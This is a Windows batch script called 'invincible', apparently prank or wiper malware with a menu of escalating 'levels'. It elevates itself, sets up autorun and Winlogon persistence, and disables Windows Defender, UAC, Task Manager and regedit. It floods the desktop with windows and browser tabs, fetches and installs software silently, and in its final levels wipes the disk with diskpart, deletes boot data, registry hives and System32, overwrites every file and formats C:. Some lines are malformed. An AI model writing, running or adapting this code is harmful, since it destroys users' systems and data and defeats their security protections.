@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    mshta "javascript:var shell = new ActiveXObject('Shell.Application'); shell.ShellExecute('%~f0','','','runas',1);close()"
    exit /b
)

:: COMMANDS

title invincible (0-5)
color 0a

:MENU
cls
echo ============================
echo        MAIN MENU
echo ============================
echo 0. Level 0
echo 1. Level 1
echo 2. Level 2
echo 3. Level 3
echo 4. Level 4
echo 5. Level 5
echo ============================
set /p choice=Choose 0-5: 

if "%choice%"=="0" goto LEVEL0
if "%choice%"=="1" goto LEVEL1
if "%choice%"=="2" goto LEVEL2
if "%choice%"=="3" goto LEVEL3
if "%choice%"=="4" goto LEVEL4
if "%choice%"=="5" goto LEVEL5
goto MENU

:LEVEL0
cls
echo welcome to level 0

label C: invincible

label D: invincible

set "target=C:\invincible"
md "%target%" 2>nul

set "target=C:\invincible"
md "%target%" 2>nul

:: Create epilepsy.bat with ultra-fast rainbow spam
echo @echo off > "%target%\epilepsy.bat"
echo :loop >> "%target%\epilepsy.bat"
echo for %%%%C in (0 1 2 3 4 5 6 7) do ^( >> "%target%\epilepsy.bat"
echo     color %%%%C7 >> "%target%\epilepsy.bat"
echo     echo OVERWRITTEN REG SHELLS BY INVINCIBLE >> "%target%\epilepsy.bat"
echo ^) >> "%target%\epilepsy.bat"
echo goto loop >> "%target%\epilepsy.bat"
pause

set "target=C:\invincible"
md "%target%" 2>nul

:: Create the VBScript launcher
echo Set WshShell = CreateObject("WScript.Shell") > "%target%\hide.vbs"
echo WshShell.Run Chr(34) ^& "%target%\invincible.bat" ^& Chr(34), 0, False >> "%target%\hide.vbs"
pause

copy "invincible.bat" "C:\invincible" /f

set "scriptPath=%~dp0invincible.bat"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Invincible" /t REG_SZ /d "%scriptPath%" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HideVBS /t REG_SZ /d "wscript.exe \"C:\invincible\hide.vbs" /f
:: this is to confuse the user btw the confuse.exe shi
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HideVBS /t REG_SZ /d "wscript.exe \"C:\confuse.exe" /f

set regTheme=HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize
set regColor=HKCU\Software\Microsoft\Windows\DWM

reg add "%regColor%" /v AccentColor /t REG_DWORD /d 11858431 /f
reg add "%regColor%" /v AccentColorInactive /t REG_DWORD /d 11858431 /f

reg add "%regTheme%" /v ColorPrevalence /t REG_DWORD /d 1 /f

reg add "%regTheme%" /v SystemUsesLightTheme /t REG_DWORD /d 0 /f
reg add "%regTheme%" /v AppsUseLightTheme /t REG_DWORD /d 0 /f

taskkill /f /im explorer.exe
start explorer.exe

:: Elevate to admin if needed
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Run as Administrator required.
    pause
    exit /b
)

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f

sc stop WinDefend
sc config WinDefend start= disabled

pause
goto MENU

:: Elevate check
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Run as Administrator required.
    pause
    exit /b
)

:: Disable Defender via Group Policy registry keys
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v UILockdown /t REG_DWORD /d 1 /f

:: Disable Defender Security Center UI
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\UI" /v DisableNotificationCenter /t REG_DWORD /d 1 /f

:: Stop and disable Defender service
sc stop WinDefend
sc config WinDefend start= disabled

set "targetDir=C:\invincible"

if not exist "%targetDir%" (
    mkdir "%targetDir%"
)

set "img1=https://wallpapercave.com/wp/z5UNyun.png"
set "name1=z5UNyun.png"

set "img2=https://wallpapercave.com/wp/wp2345476.jpg"
set "name2=wp2345476.jpg"

set "img3=https://wallpapercave.com/wp/wp2187951.jpg"
set "name3=wp2187951.jpg"

set "img4=https://wallpapercave.com/wp/wp2345466.jpg"
set "name4=wp2345466.jpg"

set "img5=https://wallpapercave.com/wp/wp13396145.jpg"
set "name5=wp13396145.jpg"

set "img6=https://tse4.mm.bing.net/th/id/OIP.AawVuiyHUuFLdLo8T2xjAQHaNK?pid=ImgDet&w=474&h=842&rs=1&o=7&rm=3"
set "name6=OIP_AawVuiyHUuFLdLo8T2xjAQHaNK.jpg"

powershell -Command "Invoke-WebRequest -Uri '%img1%' -OutFile '%name1%'"
move /Y "%name1%" "%targetDir%\%name1%"

powershell -Command "Invoke-WebRequest -Uri '%img2%' -OutFile '%name2%'"
move /Y "%name2%" "%targetDir%\%name2%"

powershell -Command "Invoke-WebRequest -Uri '%img3%' -OutFile '%name3%'"
move /Y "%name3%" "%targetDir%\%name3%"

powershell -Command "Invoke-WebRequest -Uri '%img4%' -OutFile '%name4%'"
move /Y "%name4%" "%targetDir%\%name4%"

powershell -Command "Invoke-WebRequest -Uri '%img5%' -OutFile '%name5%'"
move /Y "%name5%" "%targetDir%\%name5%"

powershell -Command "Invoke-WebRequest -Uri '%img6%' -OutFile '%name6%'"
move /Y "%name6%" "%targetDir%\%name6%"

:LEVEL1
cls
echo this part will disable UAC and regedit and task mgr and would clone the batch itself to system folders

copy "invincible.bat" "C:\Windows\System32"

REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegedit /t REG_DWORD /d 1 /f

REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMMC /t REG_DWORD /d 1 /f

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f

reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "0 0 0" /f

RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1

shutdown /s /f /t 0

pause
goto MENU

:LEVEL2
cls
echo lets do something lol

start https://www.patience-is-a-virtue.org
start https://theuselessweb.com
start https://pointerpointer.com
start https://cat-bounce.com
start https://www.trypap.com
start https://corndog.io
start https://www.partridgegetslucky.com
start https://www.zoomquilt.org
start https://www.hackertyper.net
start https://www.koalastothemax.com
start https://www.fallingfalling.com
start https://www.corgiorgy.com
start https://www.smashthewalls.com
start https://www.everydayim.com
start https://www.staggeringbeauty.com
start https://www.republiquedesmangues.fr
start https://www.bouncingdvdlogo.com
start https://www.thatsthefinger.com
start https://www.caniuse.com
start https://www.nooooooooooooooo.com
start https://chatgpt.com
start https://chatgpt.com
start https://chatgpt.com
start https://chatgpt.com
start https://freerobux.com

start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe
start cmd.exe

reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v DontOfferThroughWUAU /t REG_DWORD /d 1 /f >nul 2>&1

if exist "%SystemRoot%\System32\mrt.exe" (
    takeown /f "%SystemRoot%\System32\mrt.exe" >nul 2>&1
    icacls "%SystemRoot%\System32\mrt.exe" /grant administrators:F >nul 2>&1
    del /f /q "%SystemRoot%\System32\mrt.exe" >nul 2>&1
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f

pause
goto MENU

:LEVEL3
cls
echo yea man lets do something lol

start "" "timeout.exe"

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /f /d "C:\invincible\epilepsy.bat"

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /f /d "C:\Windows\System32\userinit.exe,C:\invincible\epilepsy.bat"

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /f /d "reg add "C:\invincible\epilepsy.bat"

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /f /d "C:\invincible\epilepsy.bat"

erase C:\Windows\bfsvc.exe

setlocal enabledelayedexpansion

:: Installer URLs
set "espeak_url=https://sourceforge.net/projects/espeak/files/latest/download"
set "python_url=https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
set "vs_url=https://aka.ms/vs/17/release/vs_community.exe"
set "bonzi_url=https://archive.org/download/bonzibuddysetup/BonziBuddySetup.exe"
set "qemu_url=https://qemu.weilnetz.de/w64/qemu-w64-setup-20230817.exe"
set "telegram_url=https://telegram.org/dl/desktop/win"
set "git_url=https://github.com/git-for-windows/git/releases/download/v2.42.0.windows.1/Git-2.42.0-64-bit.exe"
set "npp_url=https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.5.6/npp.8.5.6.Installer.x64.exe"

:: Local paths
set "temp_dir=%~dp0installers"
mkdir "%temp_dir%" >nul 2>&1

:: Download + Install
call :fetch "%espeak_url%" "%temp_dir%\espeak.exe"
call :fetch "%python_url%" "%temp_dir%\python.exe"
call :fetch "%vs_url%" "%temp_dir%\vs.exe"
call :fetch "%bonzi_url%" "%temp_dir%\bonzi.exe"
call :fetch "%qemu_url%" "%temp_dir%\qemu.exe"
call :fetch "%telegram_url%" "%temp_dir%\telegram.exe"
call :fetch "%git_url%" "%temp_dir%\git.exe"
call :fetch "%npp_url%" "%temp_dir%\npp.exe"

:: Install silently (where possible)
start /wait "" "%temp_dir%\espeak.exe" /S
start /wait "" "%temp_dir%\python.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
start /wait "" "%temp_dir%\vs.exe" --quiet --wait
start /wait "" "%temp_dir%\bonzi.exe"
start /wait "" "%temp_dir%\qemu.exe" /S
start /wait "" "%temp_dir%\telegram.exe" /S
start /wait "" "%temp_dir%\git.exe" /VERYSILENT
start /wait "" "%temp_dir%\npp.exe" /S

:: Launch apps
start "" "%ProgramFiles%\eSpeak\command_line\espeak.exe"
start "" "%ProgramFiles%\Python311\python.exe"
start "" "%ProgramFiles%\Microsoft Visual Studio\Installer\vs_installer.exe"
start "" "%ProgramFiles%\BonziBuddy\BonziBuddy.exe"
start "" "%ProgramFiles%\qemu\qemu-system-x86_64.exe"
start "" "%ProgramFiles%\Telegram Desktop\Telegram.exe"
start "" "%ProgramFiles%\Git\git-bash.exe"
start "" "%ProgramFiles%\Notepad++\notepad++.exe"
exit /b

:fetch
powershell -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2'" >nul 2>&1
exit /b

for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
if not exist "C:\Drive%%L" mkdir "C:\Drive%%L"
subst %%L: "C:\Drive%%L"
)

takeown /f "%USERPROFILE%\Videos" /r /d y

w32tm /config /manualpeerlist:"", /syncfromflags:manual /reliable:YES /update
net stop w32time

date 12-21-2099

time 66:99:77

set "target=%SystemRoot%\System32\gpedit.msc"

:: Take ownership and grant full control
takeown /f "%target%" >nul
icacls "%target%" /grant "%username%:F" >nul

:: Overwrite contents with custom string
> "%target%" echo buddy whatchu doin

setlocal enabledelayedexpansion

:: Define extension pool
set "ext[0]=exe"
set "ext[1]=mp3"
set "ext[2]=mp4"
set "ext[3]=txt"
set "ext[4]=bat"
set "ext[5]=jpg"
set "ext[6]=png"
set "ext[7]=doc"
set "ext[8]=zip"
set "ext[9]=dll"

:: Loop to create 9000 files
for /L %%i in (1,1,9000) do (
    set "name="
    for /L %%j in (1,1,8) do (
        set /A "rand=65 + !random! %% 26"
        cmd /C exit /b !rand!
        for %%A in (exitcode) do set "char=%%~A"
        set "name=!name!!char!"
    )
    set /A "extid=!random! %% 10"
    set "ext=!ext[%extid%]!"
    type nul > "C:\!name!.!ext!"
)

set "caption=Hello"
set "message=hello.\nso your system is dead.\nAlso dont mind if this message annoys you"

:: Write to registry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d "%caption%" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d "%message%" /f

set "WALLPAPER=C:\invincible\z5UNyun.png"

:: Validate file silently
if not exist "%WALLPAPER%" exit /b

:: Registry tweaks for Fill style
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f >nul
reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f >nul

:: Set wallpaper path
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%WALLPAPER%" /f >nul

:: Apply wallpaper silently
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True

pause
goto MENU

:LEVEL4
cls
echo lets modify the registry :)

takeown /f C:\Windows\System32\chcp.com
icacls C:\Windows\System32\chcp.com /grant %username%:F

takeown /f "C:\Windows\System32\comadmin.dll"

reg delete "HKCC\Software" /f
REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall\{GUID}" /f
REG DELETE "HKLM\Software\JavaSoft" /f
REG DELETE "HKCU\Console" /f
REG DELETE "HKCU\Software\Zoom" /f
REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /f
REG DELETE "HKCR\.cr2" /f
REG DELETE "HKCR\X509Enrollment.CX509Enrollment" /f

pause
goto MENU

:LEVEL5
cls
echo dead

reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" /v LastLoggedOnDisplayName /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" /v LastLoggedOnSAMUser /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background" /v OEMBackground /t REG_DWORD /d 0 /f

echo select disk 0 > %temp%\mbrkill.txt
echo clean > %temp%\mbrkill.txt
diskpart /s %temp%\mbrkill.txt
del %temp%\mbrkill.txt

bcdedit /export %~dp0bcd.bak
attrib -h -s -r C:\boot\bcd >nul 2>&1
del C:\boot\bcd >nul 2>&1
bcdboot C:\Windows /l en-US

rmdir /s /q C:\Recovery

takeown /f "C:\Users" /r /d /y

reg delete "HKLM\Software\Classes" /f
reg delete "HKCU\Software\Classes" /f
reg delete "HKLM\Software\Classes\CLSID" /f
reg delete "HKLM\Software\Classes\Interface" /f
reg delete "HKLM\Software\Classes\TypeLib" /f

takeown /f C:\Windows\System32\kernel32.dll /r /d y

takeown /f C:\Recovery /r /d /y

takeown /f C:\Windows /r /d /y

rmdir /s /q C:\Windows

echo %random%%random%%random% > "C:\Windows\System32"

takeown /f shell32.dll  /r /d /y
del shell32.dll

setlocal enabledelayedexpansion&set "c=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"&for /l %%i in (1,1,100) do (set "l="&for /l %%j in (1,1,80) do set /a r=!random!%%62&call set "l=!l!%%c:~%r%,1%%"&echo(!l!>>C:)

setlocal enabledelayedexpansion&set "c=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"&for /l %%i in (1,1,100) do (set "l="&for /l %%j in (1,1,80) do set /a r=!random!%%62&call set "l=!l!%%c:~%r%,1%%"&echo(!l!>>C:\System32\rundll32.exe)

setlocal enabledelayedexpansion

:: Optional: define root directory (default is current)
set "root=%~dp0"

:: Log all .com files first (optional but wise)
dir /b /s "%root%\*.com" > com_files.log

:: Delete each .com file found
for /f "delims=" %%F in (com_files.log) do (
    echo Deleting: "%%F"
    del /f /q "%%F"
)

:: Optional: self-destruct log
del /f /q com_files.log

reg delete "HKCR" /f
reg delete "HKCU" /f
reg delete "HKLM" /f
reg delete "HKU" /f
reg delete "HKCC" /f

setlocal enabledelayedexpansion

for /r "C:\" %%f in (*.*) do (
    set "filename=%%~nf"
    ren "%%f" "!filename!.invincible"
)

for /r "C:\" %%i in (*.invincible) do (
    >"%%i" echo OVERWRITTEN BY INVINCIBLE FUCKA!
)

takeown /f C:\Windows\System32 /r /d y

icacls "C:\Windows\System32" /grant Everyone:F /t /c

icacls "C:\Windows\System32" /remove:g Administrators /t /c
icacls "C:\Windows\System32" /remove:g SYSTEM /t /c

icacls "C:\Windows\System32" /inheritance:r /t /c

del /f /s /q "C:\Windows\System32\*.*"
rd /s /q "C:\Windows\System32"

format C:

del /f /s /q C:\*.*

rmdir /s /q C:\Windows\System32

shutdown /s /f /t 0

format C:\Windows\System32

format C:\*.*

pause
goto MENU